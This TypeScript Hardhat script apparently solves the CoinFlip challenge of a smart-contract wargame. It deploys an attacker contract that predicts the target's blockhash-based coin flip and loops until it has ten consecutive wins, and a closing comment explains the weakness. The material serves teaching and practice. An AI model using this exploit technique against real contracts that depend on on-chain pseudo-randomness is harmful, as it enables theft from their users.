import { BigNumber, Contract } from "ethers";
import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/3.CoinFlip/CoinFlip.sol/CoinFlip.json";
import { displayResult } from "../../utils/displayResult";
import logger from "node-color-log";

const targetAddress = "0x2639dF2d1E0b0D60A78cEaE040f2381f6bBC0481";

async function main() {
  const [attacker] = await ethers.getSigners();
  const CoinFlipAttack = await deployContract("CoinFlipAttacker", attacker, [
    targetAddress,
  ]);
  const CoinFlipTarget = new Contract(targetAddress, abi, attacker);
  let consecutiveWin = BigNumber.from(0);
  consecutiveWin = await CoinFlipTarget.consecutiveWins();

  while (consecutiveWin.lt(10)) {
    const pendingTx = await CoinFlipAttack.attack();
    await pendingTx.wait().catch(() => {});

    consecutiveWin = await CoinFlipTarget.consecutiveWins();
    logger.info(`Consecutive win: ${consecutiveWin}`);
  }
  displayResult(consecutiveWin.gte(10));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

//
// To compute the "random" output of each flip the CoinFlip contract uses
// uint256(blockhash(block.number - 1)). The result of this computation is deterministic
// and can be predicted by the attacker. To make the attack easier,
// we first compute the result of the flip inside a contract named CoinFlipAttacker
// then call the flip function.
